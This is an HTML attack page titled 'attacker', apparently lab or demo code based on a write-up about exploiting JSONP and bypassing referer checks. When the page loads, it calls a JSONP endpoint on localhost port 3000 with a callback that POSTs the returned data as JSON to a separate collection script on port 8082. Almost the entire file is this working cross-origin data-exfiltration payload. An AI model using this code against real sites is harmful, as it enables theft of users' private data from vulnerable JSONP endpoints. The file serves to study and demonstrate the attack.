<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>attacker</title>
    
    <!--Alternatively display -->
    <script type="application/javascript">
      function myCallbackConsole(data) {
        console.log(data)
      }
    </script>

    <!--based on https://infosecwriteups.com/exploiting-jsonp-and-bypassing-referer-check-2d6e40dfa24-->
    <script type="application/javascript">
      function myCallbackServer(data) {
        var http = new XMLHttpRequest();
        var url = "http://127.0.0.1:8082/store.php";
        var params = "data="+JSON.stringify(data);
        
        http.open("POST", url, true);
        
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        
        http.onreadystatechange = function() {
          if(http.readyState == 4 && http.status == 200) {
            console.log(http.responseText);
          }
        }
        http.send(params);
      }
    </script>

    <script src="http://127.0.0.1:3000/posts?callback=myCallbackServer"></script>
  </head>
  <body>
  </body>
</html>